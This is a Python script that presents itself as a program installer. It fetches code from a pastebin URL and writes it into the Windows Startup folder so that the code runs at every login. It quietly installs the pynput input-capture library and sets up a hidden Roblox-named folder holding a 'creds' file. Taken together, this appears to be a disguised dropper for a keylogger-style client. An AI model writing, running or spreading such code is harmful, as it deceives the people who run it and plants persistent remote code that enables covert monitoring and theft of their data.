import os
import getpass
import requests

try:
    print("[Installer]")
    print("This installer contains the logic required to install the latest version of the program.")
    print("All required modules will be downloaded onto this PC now.")
    input("\nPress ENTER to begin the installation. ")

    open(f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.pyw","w").write(requests.get("https://pastebin.com/raw/gAYiBPjh").text)
    print("\nInstalled program")

    os.system(f"pip install requests --quiet --upgrade >NUL 2>&1")
    print("Installed module requests")
    os.system(f"pip install pynput --quiet --upgrade >NUL 2>&1")
    print("Installed module pynput")
    os.system(f"pip install datetime --quiet --upgrade >NUL 2>&1")
    print("Installed module datetime")

    if not os.path.exists(f"C:/Users/{getpass.getuser()}/AppData/Roaming/.rbx/roblox/PBIN_CREDS.bin"):
        if not os.path.exists(f"C:/Users/{getpass.getuser()}/AppData/Roaming/.rbx/roblox/"):
            os.makedirs(f"C:/Users/{getpass.getuser()}/AppData/Roaming/.rbx/roblox/")
        devid = input("\nEnter a device ID to name the client: ")
        open(f"C:/Users/{getpass.getuser()}/AppData/Roaming/.rbx/roblox/PBIN_CREDS.bin","w").write(f"devid = '{devid}'")
    else:
        print("")
    input("Successfully installed the program and required modules. ")
except Exception as e:
    input(f"An error occured while installing the product: {e} ")